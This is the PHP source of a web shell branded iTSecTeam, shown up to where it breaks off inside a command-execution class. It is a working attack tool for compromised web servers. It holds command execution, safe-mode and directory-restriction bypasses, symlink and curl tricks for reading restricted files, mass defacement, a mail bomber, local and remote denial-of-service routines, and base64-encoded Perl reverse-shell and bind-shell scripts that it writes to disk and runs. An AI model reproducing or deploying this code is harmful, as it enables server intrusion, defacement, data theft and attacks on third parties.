<?php 
$loginPassword="";//Passwordw4z
//iTsecTeam.com 
//Coded By Amin Shokohi(Pejvak)
$itsec="<center><PRE>
	 ______  ______  ____                   ______                               
	/\__  _\/\__  _\/\  _`\                /\__  _\                              
	\/_/\ \/\/_/\ \/\ \,\L\_\     __    ___\/_/\ \/    __     __      ___ ___    
	   \ \ \   \ \ \ \/_\__ \   /'__`\ /'___\ \ \ \  /'__`\ /'__`\  /' __` __`\  
		\_\ \__ \ \ \  /\ \L\ \/\  __//\ \__/  \ \ \/\  __//\ \L\.\_/\ \/\ \/\ \ 
		/\_____\ \ \_\ \ `\____\ \____\ \____\  \ \_\ \____\ \__/.\_\ \_\ \_\ \_\
		\/_____/  \/_/  \/_____/\/____/\/____/   \/_/\/____/\/__/\/_/\/_/\/_/\/_/

</PRE>";

//++++++++++++++++++++ Init +++++++++++++++++++++
if ($_REQUEST['address']){
	if(is_readable($_REQUEST['address'])){
		chdir($_REQUEST['address']);}
	else{
		alert("Permission Denied !");
	}
}
session_start();
set_time_limit(0);
if ($loginPassword and $_SESSION['Login']!="ok"){
	Check_Password($_POST['password']);
	$passwordTitle='Change Password';
}
function Check_Password($password){
	global $loginPassword;
	if (md5($password)==$loginPassword){
		$_SESSION['Login']="ok";
	}elseif(strlen($password)>=1){
		echo "<script>alert('Password Wrong!')</script>";
	}
	if ($_SESSION['Login']!="ok"){
		echo "<center>Plase Insert Password<br><form action='".$_SERVER['PHP_SELF']."' method=post><input name=password><input type=submit value=Login></form>";
		exit;
	}
}
//error_reporting(0);
$myUrl=$_SERVER['PHP_SELF'];
$formPost="<form method=post action='".$myUrl."'>";
$formGet="<form method=get action='".$myUrl."'>";
$nowAddress='<input type=hidden name=address value="'.getcwd().'">';
$baseAddress=$_SERVER['DOCUMENT_ROOT'];
if (get_magic_quotes_gpc()){
	//Disable Magic Quote In RunTime
	function stripslashes_deep($value){
        $value = is_array($value) ?
        array_map('stripslashes_deep', $value) :
        stripslashes($value);
		return $value;
	}
	$_POST = array_map('stripslashes_deep', $_POST);
	$_GET = array_map('stripslashes_deep', $_GET);
	$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
	$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}

if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
	$slash="\\";
	$baseAddress=str_replace("/","\\",$baseAddress);
	$sampleCommand='dir';
	define("Is_Win",1);
}else{
	$slash="/";
	$baseAddress=str_replace("\\","/",$baseAddress);
	$sampleCommand='ls -la';
}

if(ini_get('disable_functions')){
	$disableFunctionList=ini_get('disable_functions');
}else{
	$disableFunctionList="All Functions Enable";
}

if(ini_get('safe_mode')){
	$safe_mode="On";
}else{
	$safe_mode="Off";
}

if($cwd==''){
	$cwd=getcwd();
}
//-------------------- Init ---------------------
//++++++++++++++++++++ Html Source ++++++++++++++++++++++
if($_SESSION['Login']=='ok'){
	$passwordTitle='Change Password';
}else{
	$passwordTitle='Set Password';
}
$head='<style type="text/css">
A:link {text-decoration: none}
A:visited {text-decoration: none}
A:active {text-decoration: none}
A:hover {text-decoration: underline overline; color: 414141;}
.focus td{border-top:0px solid #f8f8f8;border-bottom:1px solid #ddd;background:#f2f2f2;padding:0px 0px 0px 0px;}
td.control{border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080;font-size: 10pt; font-weight:700;}
table.list{bordercolor="#CDCDCD";width=950 height=1;font-family:"Tahoma";font-size: 10pt; }
</style><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>iTSecTeam</title>
</head><body bgcolor=#f2f2f2><div align="center">
&nbsp;<table border="1" width="1000" height="14" bordercolor="#CDCDCD" style="border-collapse: collapse; border-style: solid; border-width: 1px">
<tr>
<td height="30" width="996">
<p align="center"><font face="Tahoma" style="font-size: 9pt"><span lang="en-us"><a href="?do=home">Home</a> -- <a href="?do=filemanager&address='.getcwd().'">File Manager</a> -- <a href="?do=cmd&address='.getcwd().'">Command Execute</a> -- <a href="?do=bc&address='.getcwd().'">Back Connect</a> --
<a href="?do=bypasscmd&address='.getcwd().'">BypasS Command eXecute(SF-DF)</a> -- <a href="?do=symlink&address='.getcwd().'">Symlink</a> --
<a href="?do=bypassdir&address='.getcwd().'">BypasS Directory</a> -- <a href="?do=eval&address='.getcwd().'">
Eval Php</a> -- <a href="?do=db&address='.getcwd().'">Data Base</a> -- <a href="?do=convert&address='.getcwd().'">Convert</a> -- <a href="?do=mail&address='.getcwd().'">Mail Boomber</a><a href="?do=info&address='.getcwd().'">
<br>Server Information</a> -- <a href="?do=d0slocal&address='.getcwd().'">Dos Local Server</a> -- <a href="?do=dump&address='.getcwd().'">Backup Database</a> -- <a href="?do=mass&address='.getcwd().'">Mass Deface</a> -- <a href="?do=dlfile&address='.getcwd().'">Download Remote File</a> -- <a href="?do=dd0s&address='.getcwd().'">DDoS</a> -- <a href="?do=perm&address='.getcwd().'">Find Writable Directory</a> -- <a href="?do=multiupload&address='.getcwd().'">MultiUpload</a><br><a href="?do=port&address='.getcwd().'">Port Scanner</a> -- <a href="?do=cookie&address='.getcwd().'">Set Cookie</a> -- <a href="?do=processes&address='.getcwd().'">Processes List</a> -- <a href="?do=users&address='.getcwd().'">User List</a> -- <a href="?do=zone&address='.getcwd().'">Zone-H Submiter</a> -- <a href="?do=password&address='.getcwd().'">'.$passwordTitle.'</a> -- <a href="?do=server&address='.getcwd().'">Server</a> -- <a href="?do=remove&address='.getcwd().'">Remove Me</a> -- <a href="?do=about&address='.getcwd().'">About</a>
</span></font></td></tr></table></div>
<div align="center">
<table id="table2" style="border-collapse: collapse; border-style: 
solid;" width="1000" bgcolor="#eaeaea" border="1" bordercolor="#c6c6c6" 
cellpadding="0"><tbody><tr><td><div align="center"><table id="table3" style="border-style:dashed; border-width:1px; margin-top: 1px; margin-bottom: 0px; 
border-collapse: collapse" width="950" border="1" bordercolor="#cdcdcd"
height="10" bordercolorlight="#CDCDCD" bordercolordark="#CDCDCD"><tbody><tr><font face="Tahoma" style="font-size: 9pt"><div align="center">
Operation System : '.php_uname().' | Php Version : <a href="?do=phpinf0">'.phpversion().'</a> | Safe Mode : '.$safe_mode.' <td style="border: 1px solid rgb(198, 198, 198);" 
width="950" bgcolor="#e7e3de" height="10" valign="top">';
$end='</td></tr></tbody></table></div></td></tr><tr><td bgcolor="#c6c6c6"><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="http://www.itsecteam.com" target="_blank">'.base64_decode("aVRTZWNUZWFtLmNvbQ==").'</a><br><font size=1>'.base64_decode("Q29kZWQgYnkgQW1pbiBTaG9rb2hpIChQZWp2YWsp").'</font></span></td></tr></tbody></table></div></body></html>';
$deny=$head."<p align='center'> <b>Oh My God!<br> Permission Denied".$end;
//-------------------- Html Source ----------------------
class FileManager{

	function Remove_File($address){
		//Remove File
		if (@unlink($address)) return true;
	}
	function Delete_Dir($dir){
		//Remove Dir And All File List
		if (!is_writable($dir)) return false;
		if (!file_exists($dir)) return true;
		if (!is_dir($dir) || is_link($dir)) return unlink($dir);
		foreach (scandir($dir) as $item) {
		if ($item == '.' || $item == '..') continue;
		if (!$this->delete_dir($dir . "/" . $item)) {
		chmod($dir . "/" . $item, 0777);
		if (!$this->delete_dir($dir . "/" . $item)) return false;
		};
		}
		return rmdir($dir);
	}
	function Download_File($file_address,$file_name){
		//Send Header And Print File Contents For Download File
		global $slash;
		$full_address=$file_address.$file_name;
		header("Content-Disposition: attachment; filename=\"$file_name\"");   
		header("Content-Type: application/download");
		header("Content-Length: " . filesize($full_address));
		flush();
		$fp = fopen($full_address, "r");
		while (!feof($fp))
		{
			echo fread($fp, 65536);
			flush();
		} 
		fclose($fp); 
	}
	function Download_Remote($url,$savePath){
		//Download A File From Remote Url
		$newFileName = $savePath . basename($url);
		$file = fopen ($url, "rb");
		if ($file) {
			$newFile = fopen ($newFileName, "wb");
			if ($newFile){
				while(!feof($file)) {
					fwrite($newFile, fread($file, 1024 * 8 ), 1024 * 8 );
				}
			}
			alert("File Downloaded Successful");
		}else{
			alert("Can Not Open File");
		}
		if ($file) {
		  fclose($file);
		}
		if ($newFile) {
		  fclose($newFile);
		}
	}
	function Copy_Dir($sourceDir,$destDir) {
		global $slash;
		$handleDir = opendir($sourceDir);
		while (($files = readdir($handleDir)) !== FALSE) {
			if (($files != ".") and ($files != "..")) {
				if (!is_dir($sourceDir.$slash.$files)){
					$ret = copy($sourceDir.$slash.$files,$destDir.$slash.$files);
				}else{
					$ret = mkdir($destDir.$slash.$files);
					$this->Copy_Dir($sourceDir.$slash.$files,$destDir.$slash.$files);
					}
				if (!$ret){
					return $ret;
				}
			}
		}
		closedir($handleDir);
		return TRUE;
    }
	function Move_Dir($sourceDir,$destDir) {
		global $slash;
		$destDir.=$slash.basename($sourceDir);
		if(!is_dir($destDir)){
			if(!mkdir($destDir)){
				return false;
			}
		}
		if(is_writeable($destDir) && is_readable($sourceDir)){
		$handleDir = opendir($sourceDir);
		while (($files = readdir($handleDir)) !== FALSE) {
			if (($files != ".") and ($files != "..")) {
				if (!is_dir($sourceDir.$slash.$files)){
					$ret = copy($sourceDir.$slash.$files,$destDir.$slash.$files);
				}else{
					$ret = mkdir($destDir.$slash.$files);
					$this->Copy_Dir($sourceDir.$slash.$files,$destDir.$slash.$files);
					}
				if (!$ret){
					return $ret;
				}
			}
		}
		closedir($handleDir);
		$this->Delete_Dir($sourceDir);
		return TRUE;
		}else{
			return false;
		}
    }
	function Copy_File($fileSource,$fileDest,$fileName){
		//Copy A File To Dir
		global $slash;
		$source=Read_File($fileSource);
		if($fileName){
			$fileName=$fileName;
		}else{
			$fileName=basename($fileSource);
		}
		if(Write_File($fileDest.$slash.$fileName,$source)){
			return true;
		}else{
			return false;
		}
	}
	function Rename($oldName,$newName){
		//Rename File
		if(@rename($oldName,$newName)) return true;
	}
	function Move_File($fileSource,$fileDest){
		if(is_file($fileSource) && is_writeable(str_replace(basename($fileDest),"",$fileDest))){
			if ($this->Copy_File($fileSource,$fileDest,"")){
				if($this->Remove_File($fileSource)){
					return true;
				}
			}else{
				return false;
			}
		}
	}
	function FindPermDir($dirAddress){
		//Find All Writeable Dir
		global $slash;
		$idd=0;
		if ($dirhen = @opendir($dirAddress)) {
		while ($file = readdir($dirhen)) {
		$permdir=str_replace('//','/',$dirAddress.$slash.$file);
		if($file!='.' && $file!='..' && is_dir($permdir)){
		if (is_writable($permdir)) {
		$dirdata[$idd]['diraddress']=$dirAddress;
		$dirdata[$idd]['dirname']=$file;
		$idd++;
		}
		$this->FindPermDir($permdir);
					}
				}
				closedir($dirhen);
			} else {
				return ("notperm");
			}
			if ($dirdata){
				return $dirdata;
			}else{
				return "notfound";

			}
	}
	function MassDef($address,$pageName,$pageSource){
		//Create A Page To All Dir And Sub Dir
		global $slash;
		$idd=0;
		if ($dirhen = @opendir($address)) {
			while ($file = @readdir($dirhen)) {
			if($file=="." or $file=="..") continue;
				$permdir=str_replace('//','/',$address.$slash.$file);
				if($file!='.' && $file!='..' && is_dir($permdir)){
					if (is_writable($permdir)) {
						if ($fm=fopen($permdir.$slash.$pageName,"w")){
							fwrite($fm,$pageSource);
							fclose($fm);
							$dirdata[$idd]['filename']=$permdir; 
						}
						$idd++;
					}
					$this->MassDef($permdir,$pageName,$pageSource);
				}
			}
					closedir($dirhen);
			}else{
				return false;
			}
			if ($dirdata){
				return true;
			}else{
				return false;
			}
	}
	function Back($nowDir){
		//Return Back Address
		global $slash;
		//if (strlen($nowDir)<=4){
		//	return "showdrivelist";
		//}
		$splitAddress=explode($slash,$nowDir);
		$lastSplit=count($splitAddress)-1;
		$back=(substr($nowDir,0,strrpos($nowDir,$splitAddress[$lastSplit])-1));
		if (!is_win){
			$back=str_replace("\\","/",$back);
		}
		return $back;
	}
}
class DD0S{
	function D0s5_3_Local(){
		//DD0s Local Server Worked In Version 5.3.X
		$junk=str_repeat("99999999999999999999999999999999999999999999999999",99999);
		for($i=0;$i<2;){
			$buff=bcpow($junk, '3', 2);
			$buff=null;
		}
	}
	function D0s4_Local(){
		//DD0s Local Server Worked In Version 4.x.x
		$this->D0s4_Local();
	}
	function D0s_Remote($address,$time){
		//DD0s Remote Address
		for ($id=0;$$id<intval($time);$id++){
			$fp=null;
			$contents=null;
			$fp=fopen($address,"rb");
			while (!feof($fp)) {
			  $contents .= fread($fp, 8192);
			}
			fclose($fp);
		}
	}
}
class Hash{
	function Md5($str){
		//Convert String To Md5 Hash
		return md5($str);
	}
	function Sha1($str){
		return sha1($str);
	}
	function Crc32($str){
		return crc32($str);
	}
}
class Base64{
	function Encode($str){
		return base64_encode($str);
	}
	function Decode($str){
		return base64_decode($str);
	}
}
class Byp4ss{
	function Symlink($fileAddress){
		if(function_exists('symlink')){
			if(!is_writable("."))
				die("not writable directory");
			$level=0;
			for($as=0;$as<$fakedep;$as++){
				if(!file_exists($fakedir))
					mkdir($fakedir);
				chdir($fakedir);
			}
			while(1<$as--) chdir("..");
			$hardstyle = explode("/", $fileAddress);
			for($a=0;$a<count($hardstyle);$a++){
				if(!empty($hardstyle[$a])){
					if(!file_exists($hardstyle[$a])) 
						mkdir($hardstyle[$a]);
					chdir($hardstyle[$a]);
					$as++;
			}}
			$as++;
			while($as--)
				chdir("..");
			@rmdir("fakesymlink");
			@unlink("fakesymlink");
			@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
			while(1)
				if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$fileAddress, "symlink".$num))) break;
				else $num++;
			@unlink("fakesymlink");
			mkdir("fakesymlink");
		}else{
			alert("Function Symlink Not Exist");
		}
	}
	function Curl5($fileAddress){
		$level=0;
		if(!file_exists("file:"))
			mkdir("file:");
		chdir("file:");
		$level++;
		$hardstyle = explode("/", $fileAddress);
		for($a=0;$a<count($hardstyle);$a++){
			if(!empty($hardstyle[$a])){
				if(!file_exists($hardstyle[$a])) 
					mkdir($hardstyle[$a]);
				chdir($hardstyle[$a]);
				$level++;
			}
		}
		while($level--) chdir("..");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "file:file:///".$fileAddress);
		if($res=curl_exec($ch)){
			curl_close($ch);
			return $res;
		}else{
			return "Bypass Not Worked";
		}
	}
	function Curl4($fileAddress){
		$ch=curl_init("file:///".$fileAddress."\x00/../../../../../../../../../../../../".__FILE__);
		ob_start();
		curl_exec($ch);
		$res=ob_get_contents();
		ob_end_clean();
		if($res){
			return $res;
		}else{
			return "Bypass Not Worked";
		}
	}
	function Zlib($fileAddress){
	global $slash;
		copy("compress.zlib://".$fileAddress, getcwd().$slash."byp4sstmp.txt");
		if(is_file(getcwd().$slash."byp4sstmp.txt")){
			$res=Read_File(getcwd().$slash."byp4sstmp.txt");
			return $res;
		}else{
			return "Bypass Not Worked";
		}
	}
	function Glob($fileAddress){
		if($files =glob("$fileAddress*")){
			foreach ($files as $filename) {
				$res.="$filename\n";
			}
		}else{
			$res="Bypass Not Worked";
		}
		return $res;
	}
	function Ini($fileAddress){
		ini_restore("safe_mode");
		ini_restore("open_basedir");
		if($res=Read_File($fileAddress)){
			return $res;
		}else{
			return "Bypass Not Worked";
		}
	}
}
class zipfile{
	var $datasec = array(); 
	var $ctrl_dir = array(); 
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset = 0;
	function add_dir($name){
		$name = str_replace("\\", "/", $name);
		$fr = "\x50\x4b\x03\x04";
		$fr .= "\x0a\x00";
		$fr .= "\x00\x00";
		$fr .= "\x00\x00";
		$fr .= "\x00\x00\x00\x00";
		$fr .= pack("V",0);
		$fr .= pack("V",0);
		$fr .= pack("V",0);
		$fr .= pack("v", strlen($name) ); 
		$fr .= pack("v", 0 );
		$fr .= $name;
		$fr .= pack("V",$crc); 
		$fr .= pack("V",$c_len); 
		$fr .= pack("V",$unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode("", $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .="\x00\x00"; 
		$cdrec .="\x0a\x00"; 
		$cdrec .="\x00\x00"; 
		$cdrec .="\x00\x00"; 
		$cdrec .="\x00\x00\x00\x00"; 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("V",0); 
		$cdrec .= pack("v", strlen($name) );
		$cdrec .= pack("v", 0 );
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$ext = "\x00\x00\x10\x00";
		$ext = "\xff\xff\xff\xff";
		$cdrec .= pack("V", 16 );
		$cdrec .= pack("V", $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function add_file($data, $name){
		$name = str_replace("\\", "/", $name);
		$fr = "\x50\x4b\x03\x04";
		$fr .= "\x14\x00";
		$fr .= "\x00\x00";
		$fr .= "\x08\x00"; 
		$fr .= "\x00\x00\x00\x00";
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
		$c_len = strlen($zdata);
		$fr .= pack("V",$crc);
		$fr .= pack("V",$c_len);
		$fr .= pack("V",$unc_len);
		$fr .= pack("v", strlen($name) );
		$fr .= pack("v", 0 );
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack("V",$crc);
		$fr .= pack("V",$c_len); 
		$fr .= pack("V",$unc_len); 
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode("", $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .="\x00\x00";
		$cdrec .="\x14\x00"; 
		$cdrec .="\x00\x00";
		$cdrec .="\x08\x00";
		$cdrec .="\x00\x00\x00\x00"; 
		$cdrec .= pack("V",$crc); 
		$cdrec .= pack("V",$c_len); 
		$cdrec .= pack("V",$unc_len); 
		$cdrec .= pack("v", strlen($name) );
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("v", 0 ); 
		$cdrec .= pack("V", 32 ); 
		$cdrec .= pack("V", $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function file(){
		$data = implode("", $this -> datasec);
		$ctrldir = implode("", $this -> ctrl_dir);
		return
		$data.
		$ctrldir.
		$this -> eof_ctrl_dir.
		pack("v", sizeof($this -> ctrl_dir)).
		pack("v", sizeof($this -> ctrl_dir)). 
		pack("V", strlen($ctrldir)). 
		pack("V", strlen($data)). 
		"\x00\x00";
	}
}
class BackConnect{
	function Back_Connect_Perl($ip,$port){
		$back_connect_script="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
		NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
		MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
		dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
		IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
		YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
		LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
		KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
		KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
		IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
		ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
		check_error(Write_File("bcc.pl",base64_decode($back_connect_script)),'File Write');
		check_error(@system("perl bcc.pl $ip $port"),"Connect");
	}
	function Bind_Port_Perl($port){
		$bind_port_script="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
		cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
		a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
		ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
		IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
		IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
		VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
		VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
		check_error(Write_File("wbp.pl",base64_decode($bind_port_script)),'File Write');
		check_error(@system("perl wbp.pl $Port"),"Bind Port");
	}
	function Bind_Port_Perl2($port){
		$bind_port_script="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
		YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
		U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
		VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
		QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
		dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
		b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
		Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
		check_error(Write_File("lbp.pl",base64_decode($bind_port_script)),'File Writ');
		check_error(@system("perl lbp.pl $port"),"Bind Port");
	}
}
class Theme{
	function Dir($dirAddress,$dirName,$color){
		global $slash,$cwd;
		$fullDir=$dirAddress.$dirName;
		return '<table cellpadding="0" cellspacing="0" class=list bgcolor='.$color.'><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign=top height=19 width=842><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=dir" /> <a href="?address='.$dirAddress.$dirName.'">'.$dirName.'</b></td><td valign="top" height=19 width=65>'.date("y/m/d", filectime($fullDir)).'</td><td valign="top" height=19 width=30><a href="?do=chmod&filename='.$dirName.'&address='.$dirAddress.'">'.substr(sprintf('%o', fileperms($fullDir)), -3).'</a></td><td valign="top" height="19" width="30"></td><td valign="top" height=19 width=23><a href="?do=down&type=dir&address='.$dirAddress.'&dirname='.$dirName.'">DL</a></td><td valign="top" height=19 width=37><a href="?do=movedir&sourcedir='.$fullDir.'&address='.$dirAddress.'">Move</a></td><td valign=top height=19 width=36><a href="?do=copydir&sourcedir='.$fullDir.'&address='.$dirAddress.'">Copy</a></td><td valign="top" height=19 width=30><a href="?do=rename&address='.$dirAddress.'&name='.$dirName.'">Ren</a></td><td valign="top" height=19 width=29><a href="?do=delete&type=dir&address='.$dirAddress.'&dirname='.$dirName.'">Del</a></td><td valign="top" height="19" width="31"><input type="checkbox" name="checked[]" value="'.$fullDir.'"></td></tr></table>';
	}
	function Move($dirAddress,$dirName,$color){
		global $slash,$cwd;
		$fullDir=$dirAddress.$dirName;
		return '<table cellpadding="0" cellspacing="0" class=list bgcolor='.$color.'><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height=19 width=842><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=dir" /> <a href="?do=move&address='.$dirAddress.$dirName.'&sourcefile='.$_GET['sourcefile'].'">'.$dirName.'</b></td><td valign="top" height=19 width=65>'.date("y/m/d", filectime($fullDir)).'</td><td valign="top" height=19 width=30>'.substr(sprintf('%o', fileperms($fullDir)), -3).'</td></tr></table>';
	}
	function Copy($dirAddress,$dirName,$color){
		global $slash,$cwd;
		$fullDir=$dirAddress.$dirName;
		return '<table cellpadding="0" cellspacing="0" class=list bgcolor='.$color.'><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign=top height=19 width=842><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=dir" /> <a href="?do=copy&address='.$dirAddress.$dirName.'&sourcefile='.$_GET['sourcefile'].'">'.$dirName.'</b></td><td valign=top height=19 width=65>'.date("y/m/d", filectime($fullDir)).'</td><td valign=top height=19 width=30>'.substr(sprintf('%o', fileperms($fullDir)), -3).'</td></tr></table>';
	}
	function CopyDir($dirAddress,$dirName,$color){
		global $slash,$cwd;
		$fullDir=$dirAddress.$dirName;
		return '<table cellpadding="0" cellspacing="0" class=list bgcolor='.$color.'><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign=top height=19 width=842><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=dir" /> <a href="?do=copydir&address='.$dirAddress.$dirName.'&sourcedir='.$_GET['sourcedir'].'">'.$dirName.'</b></td><td valign=top height=19 width=65>'.date("y/m/d", filectime($fullDir)).'</td><td valign=top height=19 width=30>'.substr(sprintf('%o', fileperms($fullDir)), -3).'</td></tr></table>';
	}
	function MoveDir($dirAddress,$dirName,$color){
		global $slash,$cwd;
		$fullDir=$dirAddress.$dirName;
		return '<table cellpadding="0" cellspacing="0" class=list bgcolor='.$color.'><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign=top height="19" width="842"><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=dir" /> <a href="?do=movedir&address='.$dirAddress.$dirName.'&sourcedir='.$_GET['sourcedir'].'">'.$dirName.'</b></td><td valign=top height="19" width="65">'.date("y/m/d", filectime($fullDir)).'</td><td valign=top height="19" width="30">'.substr(sprintf('%o', fileperms($fullDir)), -3).'</td></tr></table>';
	}
	function File($address,$fileName,$color){
		global $slash,$cwd,$baseAddress;
		$fullFile=$address.$slash.$fileName;
		if(strlen(strpos($address,$baseAddress))>=1){
			$dir=str_replace($baseAddress,"",$address);
			$dir=str_replace("\\","/",$dir);
			$fileAddress='<a href="'.$dir.$fileName.'">'.$fileName.'</a>';
		}else{
			$fileAddress='<a href="?do=edit&address='.$address.$slash.'&filename='.$fileName.'">'.$fileName.'</a>';
		}
		return '<table cellpadding=0 cellspacing=0 bgcolor='.$color.' class=list><tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign=top height=19 width=842><img src="'.$_SERVER['PHP_SELF'].'?do=image&img=file"> '.$fileAddress.'</td><td valign=top height=19 width=100>'.calc_size(filesize($fullFile)).'</td><td valign=top height=19 width=65>'.date("y/m/d", filectime($fullFile)).'</td><td valign=top height=19 width=30><a href="?do=chmod&filename='.$fileName.'&address='.$address.'">'.substr(sprintf('%o', fileperms($fullFile)), -3).'</a></td><td valign=top height=19 width=30><a href="?do=edit&address='.$address.'&filename='.$fileName.'">Edit</a></td><td valign=top height=19 width=23><a href="?do=down&type=file&address='.$address.'&filename='.$fileName.'">DL</a></td><td valign=top height=19 width=40><a href="?do=move&address='.$address.'&sourcefile='.$address.$slash.$fileName.'">Move</a></td><td valign=top height=19 width=40><a href="?do=copy&address='.$address.'&sourcefile='.$address.$slash.$fileName.'">Copy</a></td><td valign=top height=19 width=30><a href="?do=rename&address='.$address.'&name='.$fileName.'">Ren</a></td><td valign=top height=19 width=30><a href="?do=delete&type=file&address='.$address.'&filename='.$fileName.'">Del</a></td><td valign=top height=19 width=32><input type=checkbox name="checked[]" value="'.$fullFile.'"></td></tr></table>';
	}
	function Main($source,$formType){
		global $head,$end,$nowAddress,$formGet,$formPost;
		if ($formType=="post"){
			$form=$formPost;
			$endForm="</form>";
		}elseif($formType="get"){
			$form=$formGet;
			$endForm="</form>";
		}
		return $head.$form.$nowAddress.'<p align="center"><font face=tahoma size=2>'.$source.'</p>'.$endForm.$end;
	}
}
class Execute{
	function Check_All($command){
		if($res=$this->Passthru($command)){
			return $res;
		}elseif($res=$this->Exec($command)){
			return $res;
		}elseif($res=$this->System($command)){
			return $res;
		}elseif($res=$this->Shell_Exec($command)){
			return $res;
		}elseif($res=$this->Proc_Open($command)){
			return $res;
		}elseif($res=$this->Popen($command)){
			return $res;
		}
	}
	function Passthru($command){
		if(@function_exists("passthru")){
			ob_start();
			@passthru($command);
			$res=ob_get_contents();
			ob_end_clean();
			return $res;
		}else{
			return false;
		}
